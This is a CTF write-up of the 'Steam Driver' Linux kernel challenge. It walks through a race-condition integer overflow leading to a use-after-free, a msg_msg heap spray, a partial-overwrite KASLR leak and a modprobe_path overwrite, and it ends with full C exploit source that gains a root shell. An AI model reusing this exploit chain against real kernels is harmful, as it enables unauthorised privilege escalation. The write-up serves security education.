# (pwn) Steam Driver

We are provided with the general linux kernel pwn files: a `bzImage`, `initramfs.cpio.gz`, and `run.sh`. We are also provided with the source code of the challenge driver (thank you fizzbuzz <3), which we can see as `steam_driver.ko` if we extract the initramfs.

The first thing we'll have to do is understand what the driver does. Right off the bat, the use of `unlocked_ioctl` and complete lack of any sort of locking primes us to think about race conditions, so as we're examining the code we'll be thinking about that possibility.

The driver works entirely through `ioctl` calls, which has a few commands built in:
* ADD_ENGINE
* ADD_COMPARTMENT
* DELETE_COMPARTMENT
* SHOW_ENGINE_LOG
* UPDATE_ENGINE_LOG

These commands primarily interact with two arrays of structs: `engines` and `compartments`. Each array stores its respective structs:

```c=
typedef int32_t id_t;

typedef struct
{
    id_t id;
    uint8_t usage;
    char engine_name[NAME_SZ];
    char *logs;
}engine_t;

typedef struct
{
    id_t id;
    char compartment_desc[DESC_SZ];
    engine_t *engine;
}compartment_t;
```

Each compartment is "attached" to an engine through the use of a pointer to the engine, and each engine keeps track of the number of compartments attached to it through the use of the `usage` member. Engines also have a `logs` pointer, which is initialized on their creation:
```c=
    engines[idx]->logs = kzalloc(LOG_SZ, GFP_ATOMIC);
    if (!(engines[idx]->logs) || copy_from_user(engines[idx]->engine_name, name, NAME_SZ))
    {
        kfree(engines[idx]);
        engines[idx] = NULL;
        return -1;
    }
```

An astute observer might notice that it's possible to have the logs pointer initialized but never freed if an invalid name pointer is provided (which causes `copy_from_user`) to fail. It's questionable whether this is of any use, but nonetheless we'll keep it in mind.

At the start of the `add_engine` function and the end of the `add_compartment` function, there is a call to the `automated_engine_shutdown` function:
```c=
static long automated_engine_shutdown(void)
{
    int i;
    long counter = 0;
    for (i = 0; i < MAX_ENGINES; i++)
    {
        if (engines[i] && !engines[i]->usage)
        {
            kfree(engines[i]->logs);
            engines[i]->logs = NULL;
            kfree(engines[i]);
            engines[i] = NULL;
            counter++;
        }
    }
    return counter;
}
```

This acts as a sort of garbage collector: whenever the usage member of an engine goes to 0 (i.e. when no more compartments for it exist), it is freed along with its logs buffer.

There is immediately a potential for interesting behavior here; can we somehow get a compartment that points to an engine that's already been freed (in other words, a use-after-free)?

The `uint8_t` type of the usage member invites the possibility of integer overflow due to how small it is, so let's examine the places in the code where the usage member is updated. We see this in `add_compartment`:
```c=
    compartments[alloc_idx]->engine = engines[target_idx];
    engines[target_idx]->usage++;
    automated_engine_shutdown();
```

Perfect! It doesn't check for overfl-
```c=
    if (engines[target_idx]->usage == 0xff)
    {
        return -1;
    }
```

Oops. Nevermind. It checks if we're already at max usage.

But wait! We still have that whole race condition idea from earlier. There's quite a bit of work that needs to be done when we're creating a compartment:

1. an empty slot for the compartment needs to be found
2. 4 random bytes need to be generated for the id
3. the 0x70 byte description needs to be copied over from userspace

All of this happens after the `usage` check in the beginning. This gives us a relatively nice window for a race condition; if we have two threads adding a compartment at the same time when the usage is at `0xfe`, we might be able to overflow the usage to 0 and trigger the shutdown function to free our engine.

If this were a slightly older version of Linux, this would be trivial: we could stall the `add_compartment` function on the `copy_from_user` near the end using the famous userfaultfd technique (https://blog.lizzie.io/using-userfaultfd.html). However, there was recently a patch introduced to the kernel in version 5.11 which prevents an unprivileged (non-root) userfaultfd from handling kernel pagefaults. Instead, we're going to have to go the slightly more annoying route of just looping two threads until they successfully race.

Whenever there's an unreliable race condition like this, we should consider what will happen if it doesn't work in exactly the way we want it. In our case, nothing really bad happens. The only bad result we could potentially have is two compartments getting added to the same slot, which doesn't really pose any problems for us; if we want to free both of them it'll just fail to free one. Otherwise, there are no consequences to just looping this over and over until we get what we want, which is the ideal scenario.

To further extend our race condition window, we can add a bunch of useless compartments to a second engine. This will make the linear search for an empty slot in the array take longer, but since the array is relatively short (512 max compartments) it probably doesn't matter too much.

Once we implement this in our exploit, we can confirm that it worked through QEMU's GDB support.

Examining the `engines` array shows us that there is only one engine, with address `0xffff911081219300`:
![](https://i.imgur.com/Q0ezPYt.png)

However, let's look at the latest compartment in the `compartments` array:
![](https://i.imgur.com/KMiMVn2.png)

The engine pointer there is `0xffff911081219400`, which is very clearly not in the list! We now have a use-after-free!

Now, the question is what we can actually do with this. It wouldn't really be useful for us to immediately allocate another engine in the same space, so presumably we're going to want another object that goes into the same `kmalloc` slab. The simplest approach for this is to look at the sizes of all the structs in the driver:

* engine_t:      56  bytes (kmalloc-64)
* compartment_t: 128 bytes (kmalloc-128)
* log buffer:    128 bytes (kmalloc-128)

Even though compartment_t and log buffer are in the same kmalloc slab, it doesn't seem like we'll be able to do anything useful with either of them. We'll need to look at kernel structs to see what we can do. Luckily, there's a pretty nice blog post that has candidates for the various slab sizes: https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628

We've only really got one candidate for kmalloc-64. I tried very hard to find other potential structs through the use of codeQL, but couldn't find much of use (although there might be, don't take my word for it!). That leaves us with the `msg_msg` struct (taken straight from https://elixir.bootlin.com/linux/v5.14/source/include/linux/msg.h#L9):

```c=
/* one msg_msg structure for each message */
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};
```

If we look at the offsets of each member, we can see our actual message starts at offset 0x30. This corresponds to where the logs pointer would be in the `engine_t` struct. This gives us full control over the logs pointer for the components that have the dangling pointer to the engine struct.

A few possible ways we can use this are immediately clear: we can use this along with the `show_engine_log` and `update_engine_log` functions to get arbitrary read and write respectively. There's one problem: KASLR is enabled along with the other basic protections (SMAP + SMEP), so we're going to need to get a leak for this to be of any use.

Okay, we'll just use the freed log pointer and read from that to get some kind of kernel base leak, surely there's no problems with that!
```c=
            kfree(engines[i]->logs);
            engines[i]->logs = NULL;
```

There are indeed problems with that. Since the logs pointer is nulled out, we aren't even able to do a partial overwrite! But wait! Let's remember what we saw before. When we're adding an engine, if it fails to copy over the name (i.e. we give it an invalid pointer), it will free the engine, but won't free the log pointer which was already initialized. It never actually frees the log pointer, but that's okay because we can use msg_msg to get a partial overwrite of it.

Since kmalloc-128 chunks (the slab where the log buffers are allocated) always have pointers with an LSB of 0x80 or 0x00, we can get an offset chunk by overwriting the LSB with something like 0xf0. This allows us to leak the data from a chunk that wasn't ours, which lets us potentially grab a kernel pointer.

However, there's definitely some questionable stuff going on here (which honestly I wasn't even thinking about during the challenge). `CONFIG_HARDENED_USERCOPY` is enabled in the given kconfig, so why are we allowed to read past the border of two chunks? Isn't the entire job of hardened usercopy to stop that? It turns out that there are actually a few compiletime optimizations done with this. Hardened usercopy is primarily meant to deal with bugs with the size parameter passed into `copy_to_user` and `copy_from_user`, so if that size parameter is constant, it optimizes out the checks. Since our bug involves editing the pointer, but the code has a constant size, we don't actually need to deal with these checks.

With all that out of the way, we finally have a leak!

"Wait, what function pointers are you leaking!? What about the slab randomization??!"
These are questions that someone with more than 2 braincells might be asking. Luckily, if we do testing, it turns out that a good amount of the time there turns out to be some kind of magic object already in kmalloc-128 that has a function pointer at an offset of 24 bytes (given the 16 bytes of padding we have before the actual leak):
![](https://i.imgur.com/JL6nkc7.png)

Now, you would be crazy to rely on something this stupid and random in an actual exploit. However, we are working within the bounds of an hour left in the CTF, so nothing is too dumb for us to use!

Note: For anyone curious, it turns out that this is a pointer to a function called `klist_children_get`, which is apparently part of the `klist_children` member of the `device_private` struct (https://elixir.bootlin.com/linux/v5.14/source/drivers/base/core.c#L3195).

With our leak out of the way, we can now pick a target for arbitrary write. Since modules are enabled and `CONFIG_STATIC_USERMODEHELPER` is disabled, an easy target is `modprobe_path`. This technique is well known, and has been documented in many other writeups, so I'll avoid doing so here. Here's a nice writeup of the technique: https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/

Success! (ignore the fact that I am already root - this is a test environment)
![](https://i.imgur.com/48r45X3.png)

After we overwriting `modprobe_path`, we are pretty much done and can easily obtain root, giving us the flag:
![](https://i.imgur.com/AdmeqYC.png)

### Full Exploit Source

```c=
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define ARRAY_SIZE(x) (sizeof(x)/sizeof((*x)))

#define DEVICE_NAME "/dev/steam"
#define LEAK_OFFSET (0xffffffffac627710 - 0xffffffffac400000)
#define MODPROBE_OFFSET (0xffffffffad0231e0 - 0xffffffffac600000)

#define MAX_ENGINES 0x100
#define MAX_COMPARTMENTS 0x200

#define NAME_SZ 0x28
#define DESC_SZ 0x70
#define LOG_SZ 0x100

#define ADD_ENGINE 0xc00010ff
#define ADD_COMPARTMENT 0x1337beef
#define DELETE_COMPARTMENT 0xdeadbeef
#define SHOW_ENGINE_LOG 0xcafebeef
#define UPDATE_ENGINE_LOG 0xbaadbeef

//typedef int32_t steamid_t;
typedef uint64_t steamid_t;

typedef struct
{
    uint32_t id;
    uint8_t usage;
    char engine_name[NAME_SZ];
    char *logs;
}engine_t;

typedef struct
{
    uint32_t id;
    char compartment_desc[DESC_SZ];
    engine_t *engine;
}compartment_t;

typedef struct
{
    uint32_t id;
    char *name;
    char *desc;
    char *logs;
}req_t;

// my stuff starts here

int fd;
int start_race = 0;
steamid_t compartments[MAX_COMPARTMENTS];

int dev_open(void)
{
    int new_fd = open(DEVICE_NAME, O_RDONLY);
    if (new_fd < 0) {
        fputs("Failed to open device!\n", stderr);
        exit(-1);
    }

    return new_fd;
}

void *race_routine(void *arg) {
    steamid_t engine_id = (steamid_t) (unsigned long) arg;
    req_t opts = {
        .id = engine_id,
        .desc = malloc(DESC_SZ),
    };
    memset(opts.desc, 'B', DESC_SZ);

    while (!start_race);
    steamid_t component_id = ioctl(fd, ADD_COMPARTMENT, &opts);
    printf("(thread) add_compartment: %08lx\n", component_id);

    return (void *)(long) component_id;
}

void do_privesc(void) {
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/ctf/coolbin");
    system("echo -e '#!/bin/sh\\nchown root: /home/ctf/exploit\\nchmod 6777 /home/ctf/exploit' > /home/ctf/pogchamp");
    system("chmod +x /home/ctf/coolbin");
    system("chmod +x /home/ctf/pogchamp");
    system("/home/ctf/coolbin");
}

void check_privs(void) {
    if (geteuid() == 0) {
        setreuid(0, 0);
        setregid(0, 0);
        puts("[*] Obtained root!");
        system("/bin/sh -i");
        exit(0);
    }
}

int main(void)
{
    check_privs();
    int ret = -1;
    fd = dev_open();

    req_t opts = {
        .name = malloc(NAME_SZ),
    };
    memset(opts.name, 'C', NAME_SZ);

    steamid_t engine_id = ioctl(fd, ADD_ENGINE, &opts);
    printf("main engine id:  %08lx\n", engine_id);

    int inuse = 0;
    
    // create 0xfe compartments to prep for integer overflow race
    opts.id = engine_id;
    opts.desc = malloc(DESC_SZ);
    strcpy(opts.desc, "AAAAAAAA");
    for (int i = 0; i < 254; i++, inuse++) {
        compartments[inuse] = ioctl(fd, ADD_COMPARTMENT, &opts);
        if (compartments[inuse] == -1) {
            fprintf(stderr, "Failed to add compartment %d\n", inuse);
            exit(-1);
        }
    }

    // create more components on separate engine to extend race window
    steamid_t trash_id = ioctl(fd, ADD_ENGINE, &opts);
    printf("trash engine id: %08lx\n", trash_id);
    opts.id = trash_id;
    for (int i = 0; i < 255; i++, inuse++) {
        compartments[inuse] = ioctl(fd, ADD_COMPARTMENT, &opts);
        if (compartments[inuse] == -1) {
            fprintf(stderr, "Failed to add compartment %d\n", inuse);
            exit(-1);
        }
    }

    steamid_t result1, result2;
    pthread_t thread1, thread2;
    for (int i = 0; i < 100000; i++) {
        pthread_create(&thread1, NULL, race_routine, (void *) (unsigned long) engine_id);
        pthread_create(&thread2, NULL, race_routine, (void *) (unsigned long) engine_id);

        usleep(5000);
        start_race = 1;
        pthread_join(thread1, (void **) &result1);
        pthread_join(thread2, (void **) &result2);

        if (result1 != -1 && result2 != -1) {
            break;
        } else if (result1 == -1 && result2 == -1) {
            goto cleanup;
        }
        if (result1 != -1) {
            opts.id = result1;
            ioctl(fd, DELETE_COMPARTMENT, &opts);
        }
        if (result2 != -1) {
            opts.id = result2;
            ioctl(fd, DELETE_COMPARTMENT, &opts);
        }
        start_race = 0;
    }

    compartments[inuse++] = result1;
    compartments[inuse++] = result2;

    // allocate an engine, but fail on name copy
    // this puts a real log pointer where the UAF engine is
    opts.name = (void *)0x4141414141414141;
    printf("add engine: %d\n", ioctl(fd, ADD_ENGINE, &opts));

    int mqueue = msgget(IPC_PRIVATE, IPC_CREAT | 0777);
    printf("msg queue: %d\n", mqueue);

    struct msgbuf *msgptr = malloc(sizeof(*msgptr) + 0x100);
    msgptr->mtype = 0x1337;
    strcpy(msgptr->mtext, "\xf0");
    printf("msgsnd: %d\n", msgsnd(mqueue, msgptr, 1, 0));

    printf("result2: %08lx\n", result2);
    unsigned long payload[LOG_SZ/sizeof(unsigned long)];
    opts.id = result2;
    opts.logs = (char *) payload;
    if (ioctl(fd, SHOW_ENGINE_LOG, &opts) == -1) {
        goto cleanup;
    }
    for (int i = 0; i < ARRAY_SIZE(payload); i++) {
        printf("%016lx\n", payload[i]);
    }

    unsigned long leak = payload[5] - LEAK_OFFSET;
    if ((leak & 0xffff) != 0)
        goto cleanup;
    unsigned long modprobe = leak + MODPROBE_OFFSET;
    printf("kernel base: %p\n", (void *) leak);
    printf("modprobe: %p\n", (void *) modprobe);
    msgrcv(mqueue, msgptr, 1, 0, 0);

    msgptr->mtype = 0x1337;
    *((unsigned long *) msgptr->mtext) = modprobe;
    printf("msgsnd: %d\n", msgsnd(mqueue, msgptr, 8, 0));

    strcpy((char *) payload, "/home/ctf/pogchamp");
    ioctl(fd, UPDATE_ENGINE_LOG, &opts);

    do_privesc();

    ret = 0;

cleanup:
    for (int i = inuse-1; i >= 0; i--) {
        opts.id = compartments[i];
        //printf("%08x\n", compartments[i]);
        //printf("deleting: %d\n", ioctl(fd, DELETE_COMPARTMENT, &opts));
        ioctl(fd, DELETE_COMPARTMENT, &opts);
    }
    
    return ret;
}
```
